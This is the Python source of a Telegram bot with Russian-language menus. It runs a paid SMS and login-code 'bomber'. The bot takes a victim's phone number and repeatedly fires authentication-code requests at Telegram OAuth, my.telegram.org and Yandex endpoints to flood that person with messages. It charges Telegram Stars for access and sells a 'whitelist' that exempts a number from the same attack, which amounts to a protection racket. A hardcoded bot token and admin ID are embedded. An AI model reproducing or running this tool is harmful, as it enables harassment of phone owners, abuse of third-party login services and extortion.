import os
import json
import time
import asyncio
import aiohttp
import phonenumbers
from datetime import datetime
from threading import Thread
import traceback
from telebot import TeleBot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice
)

TOKEN = "8904336309:AAHBQM3tBk2Qhl4fB-uYbFqZZJl5mMs4Ks0"
ADMIN_ID = 341311229
REQUIRED_CHANNELS = ['@test_my_burger']
LOG_CHANNEL_ID = None # Можешь указать ID чата/канала для логов ошибок, если нужно
MAX_CYCLES = 10
COOLDOWN_SECONDS = 60

bot = TeleBot(TOKEN)

# Файлы баз данных
USERS_DB = "users_db.json"
WHITELIST_DB = "whitelist_db.json"
SETTINGS_DB = "settings_db.json"

TARGET_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password',
    'https://api.my.id/auth',
    'https://passport.yandex.ru/auth/rest/mobile/code'
]

stop_flags = {}
temp_data = {}

# --- НАСТРОЙКИ (ЦЕНЫ) ---
def load_settings():
    default_settings = {"sub_price": 15, "whitelist_price": 30}
    if not os.path.exists(SETTINGS_DB):
        save_settings(default_settings)
        return default_settings
    try:
        with open(SETTINGS_DB, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default_settings

def save_settings(settings):
    with open(SETTINGS_DB, "w", encoding="utf-8") as f:
        json.dump(settings, f, ensure_ascii=False, indent=4)

# --- ЛОГИРОВАНИЕ ОШИБОК ---
def log_error(user_id, error_text):
    tb = traceback.format_exc()
    full_log = f"❌ Ошибка в боте:\n{error_text}\n\nTraceback:\n{tb}"
    print(full_log)
    if LOG_CHANNEL_ID:
        try:
            bot.send_message(LOG_CHANNEL_ID, f"⚠️ *Ошибка у юзера `{user_id}`*\n```{full_log[:3500]}```", parse_mode='Markdown')
        except:
            pass

# --- БАЗЫ ДАННЫХ ---
def load_db():
    if not os.path.exists(USERS_DB):
        return {}
    try:
        with open(USERS_DB, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_db(db):
    with open(USERS_DB, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=4)

def load_whitelist():
    if not os.path.exists(WHITELIST_DB):
        return []
    try:
        with open(WHITELIST_DB, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_whitelist(wl):
    with open(WHITELIST_DB, "w", encoding="utf-8") as f:
        json.dump(wl, f, ensure_ascii=False, indent=4)

def is_phone_protected(phone):
    wl = load_whitelist()
    return phone in wl

def ensure_user_record(user_id, from_user=None):
    db = load_db()
    uid_str = str(user_id)
    if uid_str not in db:
        db[uid_str] = {
            "first_name": from_user.first_name if from_user else "Unknown",
            "username": from_user.username if from_user else None,
            "has_access": False,
            "stars_spent": 0,
            "total_orders": 0,
            "referrals_count": 0,
            "last_order_time": None
        }
        save_db(db)
    return db[uid_str]

# --- ПРОВЕРКА ПОДПИСКИ ---
def check_subscription(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except:
        return False

def show_subscription_request(chat_id):
    markup = InlineKeyboardMarkup()
    for channel in REQUIRED_CHANNELS:
        markup.add(InlineKeyboardButton(f"📲 Подписаться на канал", url=f"https://t.me/{channel[1:]}"))
    markup.add(InlineKeyboardButton("✅ Я подписался", callback_data='check_subscription'))
    bot.send_message(chat_id, "📢 *Для использования бота подпишитесь на канал:*", parse_mode='Markdown', reply_markup=markup)

# --- ВАЛИДАЦИЯ НОМЕРОВ ---
def format_and_validate_phone(raw_text):
    try:
        if raw_text.startswith("8") and len(raw_text) == 11:
            raw_text = "+7" + raw_text[1:]
        elif not raw_text.startswith("+"):
            raw_text = "+" + raw_text
            
        parsed = phonenumbers.parse(raw_text, None)
        if phonenumbers.is_valid_number(parsed):
            formatted = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
            return formatted.replace("+", "")
    except Exception:
        pass
    
    digits = "".join(filter(str.isdigit, raw_text))
    if len(digits) >= 10:
        return digits
    return None

# --- АСИНХРОННЫЕ ЗАПРОСЫ ---
async def send_single_request_async(session, url, phone):
    try:
        async with session.post(url, data={"phone": phone}, timeout=10) as response:
            return response.status == 200
    except:
        return False

async def run_delivery_async(chat_id, message_id, phone, cycles):
    total_requests = len(TARGET_URLS) * cycles
    completed = 0
    successful = 0

    conn = aiohttp.TCPConnector(limit=50)
    async with aiohttp.ClientSession(connector=conn) as session:
        for cycle in range(cycles):
            if stop_flags.get(chat_id):
                break

            tasks = [send_single_request_async(session, url, phone) for url in TARGET_URLS]
            results = await asyncio.gather(*tasks)

            for res in results:
                if stop_flags.get(chat_id):
                    break
                completed += 1
                if res:
                    successful += 1

            if completed % 5 == 0 or completed >= total_requests:
                try:
                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton("⛔ Остановить процесс", callback_data='cancel_delivery'))
                    bot.edit_message_text(
                        f"⚡ *Выполнение процесса...*\n\n"
                        f"📱 Номер: `{phone}`\n"
                        f"📊 Прогресс: `{completed}/{total_requests}`\n"
                        f"✅ Успешно: `{successful}`\n"
                        f"❌ Ошибок: `{completed - successful}`",
                        chat_id,
                        message_id,
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
                except:
                    pass
            await asyncio.sleep(0.2)

    is_stopped = stop_flags.get(chat_id, False)
    status_text = "⛔ *Процесс остановлен пользователем!*" if is_stopped else "✅ *Процесс успешно завершен!*"

    try:
        bot.edit_message_text(
            f"{status_text}\n\n"
            f"📱 Номер: `{phone}`\n"
            f"📊 Всего запросов: `{completed}`\n"
            f"✅ Успешных: `{successful}`",
            chat_id,
            message_id,
            parse_mode='Markdown'
        )
    except:
        pass
    stop_flags.pop(chat_id, None)

def trigger_async_delivery(chat_id, message_id, phone, cycles):
    asyncio.run(run_delivery_async(chat_id, message_id, phone, cycles))

# --- ГЛАВНОЕ МЕНЮ ---
def show_main_menu(chat_id, user_id):
    user = ensure_user_record(user_id)
    has_access = user.get("has_access", False)

    markup = InlineKeyboardMarkup()
    if has_access:
        markup.add(InlineKeyboardButton("🚀 Запустить задачу (Доступ открыт)", callback_data='start_task'))
    else:
        settings = load_settings()
        markup.add(InlineKeyboardButton(f"⭐ Купить доступ ({settings.get('sub_price', 15)} ⭐)", callback_data='buy_sub'))
        
    markup.add(InlineKeyboardButton("🛡 Вайт-лист номера (Защита)", callback_data='whitelist_menu'))
    markup.add(InlineKeyboardButton("👤 Профиль", callback_data='profile'))
    
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("👑 Панель Администратора", callback_data='admin_panel'))

    bot.send_message(chat_id, "👋 *Главное меню сервиса:*", reply_markup=markup, parse_mode='Markdown')

# --- АДМИН-ПАНЕЛЬ ---
def show_admin_panel(chat_id, message_id=None):
    settings = load_settings()
    db = load_db()
    total_users = len(db)
    active_subs = sum(1 for u in db.values() if u.get("has_access"))
    
    text = (
        f"👑 *Панель Администратора*\n\n"
        f"👥 Всего юзеров: `{total_users}`\n"
        f"⭐ Активных подписок: `{active_subs}`\n\n"
        f"⚙️ Цены:\n"
        f"• Подписка: `{settings.get('sub_price', 15)} ⭐`\n"
        f"• Вайт-лист: `{settings.get('whitelist_price', 30)} ⭐`"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ Выдать подписку", callback_data='adm_give_sub'))
    markup.add(InlineKeyboardButton("➖ Забрать подписку", callback_data='adm_take_sub'))
    markup.add(InlineKeyboardButton("🛡 Добавить в Вайт-лист", callback_data='adm_add_wl'))
    markup.add(InlineKeyboardButton("🗑 Удалить из Вайт-листа", callback_data='adm_del_wl'))
    markup.add(InlineKeyboardButton("💵 Изменить цены", callback_data='adm_change_prices'))
    markup.add(InlineKeyboardButton("📥 Скачать бэкап баз", callback_data='adm_download_backup'))
    markup.add(InlineKeyboardButton("🔙 Главное меню", callback_data='back_to_menu'))

    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')

def adm_ask_user_id_for_sub(message, action):
    action_text = "выдачи подписки" if action == "give" else "снятия подписки"
    msg = bot.send_message(message.chat.id, f"👤 Введите `Telegram ID` пользователя для {action_text}:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, adm_process_sub_action, action)

def adm_process_sub_action(message, action):
    try:
        target_id = int(message.text.strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ Неверный ID.")
        show_admin_panel(message.chat.id)
        return

    db = load_db()
    uid_str = str(target_id)
    if uid_str not in db:
        db[uid_str] = {"has_access": False, "stars_spent": 0, "total_orders": 0}

    if action == "give":
        db[uid_str]["has_access"] = True
        bot.send_message(message.chat.id, f"✅ Подписка успешно выдана юзеру `{target_id}`!", parse_mode='Markdown')
    else:
        db[uid_str]["has_access"] = False
        bot.send_message(message.chat.id, f"❌ Подписка забрана у юзера `{target_id}`!", parse_mode='Markdown')
    
    save_db(db)
    show_admin_panel(message.chat.id)

def adm_ask_phone_for_wl(message, action):
    action_text = "добавления в вайт-лист" if action == "add" else "удаления из вайт-листа"
    msg = bot.send_message(message.chat.id, f"📱 Введите номер телефона для {action_text}:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, adm_process_wl_action, action)

def adm_process_wl_action(message, action):
    phone = format_and_validate_phone(message.text)
    if not phone:
        bot.send_message(message.chat.id, "❌ Некорректный номер.")
        show_admin_panel(message.chat.id)
        return

    wl = load_whitelist()
    if action == "add":
        if phone not in wl:
            wl.append(phone)
            save_whitelist(wl)
        bot.send_message(message.chat.id, f"🛡 Номер `{phone}` добавлен в Вайт-лист.", parse_mode='Markdown')
    else:
        if phone in wl:
            wl.remove(phone)
            save_whitelist(wl)
        bot.send_message(message.chat.id, f"🗑 Номер `{phone}` удален из Вайт-листа.", parse_mode='Markdown')
    
    show_admin_panel(message.chat.id)

def adm_ask_new_prices(message):
    try:
        parts = message.text.split()
        sub_p = int(parts[0])
        wl_p = int(parts[1])
        settings = load_settings()
        settings["sub_price"] = sub_p
        settings["whitelist_price"] = wl_p
        save_settings(settings)
        bot.send_message(message.chat.id, f"✅ Цены обновлены!\nПодписка: {sub_p} ⭐\nВайт-лист: {wl_p} ⭐")
    except:
        bot.send_message(message.chat.id, "❌ Ошибка. Введите два числа через пробел, например: `15 30`", parse_mode='Markdown')
    show_admin_panel(message.chat.id)

# --- ОБРАБОТЧИКИ СООБЩЕНИЙ И ОПЛАТЫ ---
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    ensure_user_record(user_id, from_user=message.from_user)

    if not check_subscription(user_id):
        show_subscription_request(message.chat.id)
        return
    show_main_menu(message.chat.id, user_id)

@bot.pre_checkout_query_handler(func=lambda query: True)
def pre_checkout_query(query):
    try:
        bot.answer_pre_checkout_query(query.id, ok=True)
    except:
        pass

@bot.message_handler(content_types=['successful_payment'])
def successful_payment(message):
    payload = message.successful_payment.invoice_payload
    uid_str = str(message.chat.id)
    db = load_db()

    if payload == "unlimited_access":
        if uid_str in db:
            db[uid_str]["has_access"] = True
            db[uid_str]["stars_spent"] = db[uid_str].get("stars_spent", 0) + 15
            save_db(db)

        bot.send_message(message.chat.id, "✅ *Оплата прошла успешно! Доступ навсегда разблокирован!*", parse_mode='Markdown')
        show_main_menu(message.chat.id, message.from_user.id)

    elif payload.startswith("whitelist_"):
        phone_to_add = payload.replace("whitelist_", "")
        whitelist = load_whitelist()
        if phone_to_add not in whitelist:
            whitelist.append(phone_to_add)
            save_whitelist(whitelist)

        if uid_str in db:
            db[uid_str]["stars_spent"] = db[uid_str].get("stars_spent", 0) + 30
            save_db(db)

        bot.send_message(message.chat.id, f"🛡 *Номер `{phone_to_add}` успешно добавлен в защищенный Вайт-лист!*", parse_mode='Markdown')
        show_main_menu(message.chat.id, message.from_user.id)

def process_whitelist_input(message):
    phone = format_and_validate_phone(message.text)
    settings = load_settings()
    wl_price = settings.get("whitelist_price", 30)
    
    if not phone:
        bot.send_message(message.chat.id, "❌ Некорректный номер телефона!")
        show_main_menu(message.chat.id, message.from_user.id)
        return

    prices = [LabeledPrice(label=f'Вайт-лист ({wl_price} Stars)', amount=wl_price)]
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(f"🛡 Оплатить {wl_price} звёзд", pay=True))
    markup.add(InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))

    bot.send_invoice(
        chat_id=message.chat.id,
        title="🛡 Защита номера",
        description=f"Добавление номера {phone} в вайт-лист",
        invoice_payload=f"whitelist_{phone}",
        provider_token="",
        currency="XTR",
        prices=prices,
        reply_markup=markup
    )

def process_phone(message):
    phone = format_and_validate_phone(message.text)
    if not phone:
        bot.send_message(message.chat.id, "❌ Некорректный номер! Введите заново:")
        bot.register_next_step_handler(message, process_phone)
        return

    if is_phone_protected(phone):
        bot.send_message(message.chat.id, f"🛡 *Номер `{phone}` в защищенном Вайт-листе! Отправка заблокирована.*", parse_mode='Markdown')
        show_main_menu(message.chat.id, message.from_user.id)
        return

    temp_data[message.chat.id] = phone
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Подтвердить", callback_data='confirm_phone'),
        InlineKeyboardButton("✏️ Изменить", callback_data='edit_phone')
    )
    bot.send_message(message.chat.id, f"📱 Номер: `{phone}`\nВсё верно?", parse_mode='Markdown', reply_markup=markup)

def ask_cycles(message, phone):
    msg = bot.send_message(message.chat.id, f"📊 Укажите количество циклов (от 1 до {MAX_CYCLES}):", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_cycles, phone)

def process_cycles(message, phone):
    try:
        cycles = int(message.text)
        if not (1 <= cycles <= MAX_CYCLES):
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, f"⚠️ Введите число от 1 до {MAX_CYCLES}:")
        bot.register_next_step_handler(message, process_cycles, phone)
        return

    db = load_db()
    uid_str = str(message.from_user.id)
    user_data = db.get(uid_str, {})
    last_order = user_data.get("last_order_time")

    if last_order and not user_data.get("has_access"):
        last_time = datetime.fromisoformat(last_order)
        delta = (datetime.utcnow() - last_time).total_seconds()
        if delta < COOLDOWN_SECONDS:
            remaining = int(COOLDOWN_SECONDS - delta)
            bot.send_message(message.chat.id, f"⏳ Кулдаун! Подождите `{remaining}` секунд.", parse_mode='Markdown')
            show_main_menu(message.chat.id, message.from_user.id)
            return

    if uid_str in db:
        db[uid_str]["last_order_time"] = datetime.utcnow().isoformat()
        db[uid_str]["total_orders"] = db[uid_str].get("total_orders", 0) + 1
        save_db(db)

    stop_flags[message.chat.id] = False
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Остановить процесс", callback_data='cancel_delivery'))

    status_msg = bot.send_message(message.chat.id, f"🚀 *Запуск процесса...*\n📱 Номер: `{phone}`", parse_mode='Markdown', reply_markup=markup)
    Thread(target=trigger_async_delivery, args=(message.chat.id, status_msg.message_id, phone, cycles)).start()

def show_profile(chat_id, user_id, message_id=None):
    user = ensure_user_record(user_id)
    has_access = "Да (Навсегда)" if user.get("has_access") else "Нет"
    stars_spent = user.get("stars_spent", 0)
    total_orders = user.get("total_orders", 0)

    text = (
        f"👤 *Ваш профиль:*\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"⭐ Безлимитный доступ: *{has_access}*\n"
        f"💎 Потрачено звёзд: `{stars_spent} ⭐`\n"
        f"📦 Всего запусков: `{total_orders}`"
    )
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))

    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')

# --- КОЛЛБЭКИ ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        chat_id = call.message.chat.id
        user_id = call.from_user.id
        data = call.data

        if data == 'check_subscription':
            if check_subscription(user_id):
                bot.delete_message(chat_id, call.message.message_id)
                show_main_menu(chat_id, user_id)
            else:
                bot.answer_callback_query(call.id, "❌ Вы подписались не на все каналы!", show_alert=True)

        elif data == 'back_to_menu':
            bot.delete_message(chat_id, call.message.message_id)
            show_main_menu(chat_id, user_id)

        elif data == 'profile':
            show_profile(chat_id, user_id, call.message.message_id)

        elif data == 'start_task':
            bot.delete_message(chat_id, call.message.message_id)
            msg = bot.send_message(chat_id, "📱 Введите номер телефона:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_phone)

        elif data == 'buy_sub':
            settings = load_settings()
            price_val = settings.get("sub_price", 15)
            prices = [LabeledPrice(label=f'Доступ навсегда ({price_val} Stars)', amount=price_val)]
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton(f"⭐ Оплатить {price_val} звёзд", pay=True))
            markup.add(InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))
            
            bot.send_invoice(
                chat_id=chat_id,
                title="Безлимитный доступ",
                description="Пожизненный доступ к боту",
                invoice_payload="unlimited_access",
                provider_token="",
                currency="XTR",
                prices=prices,
                reply_markup=markup
            )

        elif data == 'whitelist_menu':
            bot.delete_message(chat_id, call.message.message_id)
            msg = bot.send_message(chat_id, "🛡 Введите номер для добавления в Вайт-лист:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_whitelist_input)

        elif data == 'cancel_delivery':
            stop_flags[chat_id] = True
            bot.answer_callback_query(call.id, "Остановка...")

        # Админка
        elif data == 'admin_panel' and user_id == ADMIN_ID:
            show_admin_panel(chat_id, call.message.message_id)
        elif data == 'adm_give_sub' and user_id == ADMIN_ID:
            adm_ask_user_id_for_sub(call.message, "give")
        elif data == 'adm_take_sub' and user_id == ADMIN_ID:
            adm_ask_user_id_for_sub(call.message, "take")
        elif data == 'adm_add_wl' and user_id == ADMIN_ID:
            adm_ask_phone_for_wl(call.message, "add")
        elif data == 'adm_del_wl' and user_id == ADMIN_ID:
            adm_ask_phone_for_wl(call.message, "del")
        elif data == 'adm_change_prices' and user_id == ADMIN_ID:
            msg = bot.send_message(chat_id, "💵 Введите новые цены через пробел (`[подписка]` `[вайтлист]`):", parse_mode='Markdown')
            bot.register_next_step_handler(msg, adm_ask_new_prices)
        elif data == 'adm_download_backup' and user_id == ADMIN_ID:
            bot.answer_callback_query(call.id, "Отправка файлов...")
            for fn in [USERS_DB, WHITELIST_DB, SETTINGS_DB]:
                if os.path.exists(fn):
                    with open(fn, "rb") as f:
                        bot.send_document(chat_id, f, caption=f"📁 Бэкап: {fn}")

        elif data == 'confirm_phone':
            phone = temp_data.get(chat_id)
            if phone:
                bot.delete_message(chat_id, call.message.message_id)
                ask_cycles(call.message, phone)
        elif data == 'edit_phone':
            bot.delete_message(chat_id, call.message.message_id)
            msg = bot.send_message(chat_id, "📱 Введите номер заново:")
            bot.register_next_step_handler(msg, process_phone)

    except Exception as e:
        log_error(call.from_user.id, str(e))

if __name__ == '__main__':
    print("Бот запущен и готов к работе!")
    bot.infinity_polling(skip_pending=True)
